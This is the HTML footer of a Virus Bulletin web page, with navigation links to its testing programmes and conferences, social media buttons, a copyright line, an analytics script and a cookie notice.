<p><a title="Security Events Calendar" href="/resources/calendar/">Security events calendar</a></p>
<p><a title="Newsletter" href="/newsletter/">Virus Bulletin newsletter</a></p> </div>
<div class="col-md-3">
<p><a title="VB Testing" href="/testing/">Testing</a></p>
<p><a title="VB100" href="/testing/vb1001/">VB100</a></p>
<p><a title="VBSpam" href="/testing/vbspam/">VBSpam</a></p>
<p><a title="VBWeb" href="/testing/vbweb/">VBWeb</a></p>
<p><a title="Consultancy Services" href="/testing/consultancy-services/">Consultancy services</a></p>
<p><a title="The Spammers' Compendium" href="/resources/spammerscompendium/">Spammers' Compendium</a></p> </div>
<div class="col-md-3">
<p><a title="VB2021 localhost" href="/conference/vb2021/">VB2021 localhost</a></p>
<p><a title="VB2020 localhost" href="/conference/vb2020/">VB2020 localhost</a></p>
<p><a title="VB2019" href="/conference/vb2019/">VB2019 (London)</a></p>
<p><a title="VB2018" href="/conference/vb2018">VB2018 (Montreal)</a></p>
<p><a title="VB2017" href="/conference/vb2017">VB2017 (Madrid)</a></p>
<p><a title="Conference Archive" href="/conference/vb-conference-archive/">Older conferences</a></p> </div>
<div class="col-md-3">
<div class="row">
<table style="float: right;" border="0">
<tbody>
<tr>
<td align="center"><a href="/rss" target="_blank"><img title="Get our blog updates" src="/uploads/images/buttons/rss-square-gray.png" alt="rss.png" width="35" height="35" /></a></td>
<td> </td>
<td align="center"><a href="https://twitter.com/virusbtn" target="_blank"><img class="bhtmbxoyxwpzahwcvxnw" title="Visit us on Twitter" src="/uploads/images/buttons/twitter-square-gray.png" alt="twitter.png" width="35" height="35" /></a></td>
<td> </td>
<td align="center"><a href="https://www.linkedin.com/company/virus-bulletin" target="_blank"><img class="bhtmbxoyxwpzahwcvxnw" title="Visit us on LinkedIn" src="/uploads/images/buttons/linkedin-square-gray.png" alt="linkedin.png" width="35" height="35" /></a></td>
<td> </td>
<td align="center"><a href="https://www.facebook.com/virusbulletin" target="_blank"><img title="Visit us on Facebook" src="/uploads/images/buttons/fb-square-gray.png" alt="twitter.png" width="35" height="35" /></a></td>
<td> </td>
<td align="center"><a href="https://www.youtube.com/user/virusbtn" target="_blank"><img title="Visit us on Youtube" src="/uploads/images/buttons/youtube-square-gray.png" alt="youtube.png" width="35" height="35" /></a></td>
</tr>
</tbody>
</table>
</div> </div>
</div>
<div class="row ">
<div class="col-md-12">
</div>
</div>
</div>
</div>
</footer>

<footer class="bs-footer2" role="contentinfo">
<div class="container">
<div class="bs-social2">
<div class="row ">
<div class="col-md-3">
</div>
<div class="col-md-3">
</div>
<div class="col-md-3">
</div>
<div class="col-md-3">
</div>
</div>
<div class="row ">
<div class="col-md-12">
<p style="text-align: left;">©1989-2022 Virus Bulletin.        <a title="Privacy Policy" href="/about-vb/privacy-policy/">Privacy policy</a>        <a title="Cookies" href="/about-vb/privacy-policy/cookies/">Cookies</a>        <a title="Terms and Conditions" href="/about-vb/terms-and-conditions/">Terms and Conditions</a></p> </div>
</div>
</div>
</div>
</footer>

<script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script async src="https://www.googletagmanager.com/gtag/js?id=UA-21876594-2"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-21876594-2', { 'anonymize_ip': true });
</script><script type="text/javascript" src="/libraries/js/fancybox.load.js"></script>
<script type="text/javascript" src="/packages/bootstrap/js/common/app.js"></script>
<div id="ccm-cookiesDisclosure" class="disclosure-bottom">
<div class="disclosure-container">
<div class="disclosure-content">
<p> We have placed cookies on your device in order to improve the functionality of this site, as outlined in our <a href="/about-vb/privacy-policy/cookies" target="_blank">cookies policy</a>. However, you may delete and block all cookies from this site and your use of the site will be unaffected. By continuing to browse this site, you are agreeing to Virus Bulletin's use of data as outlined in our <a href="/about-vb/privacy-policy/" target="_blank">privacy policy</a>.</p>
</div>
<div class="disclosure-form">
<form action="/index.php/cookies_disclosure/" method="POST">
<input type="hidden" name="allowCookies" value="1" />
<div class="button">
<input class="btn btn-info btn-sm" type="submit" name="submit" value="I understand. Don't show this message again!" />
</div>
</form>
</div>
<div class="ccm-spacer">&nbsp;</div>
</div>
</div>
</body>
</html>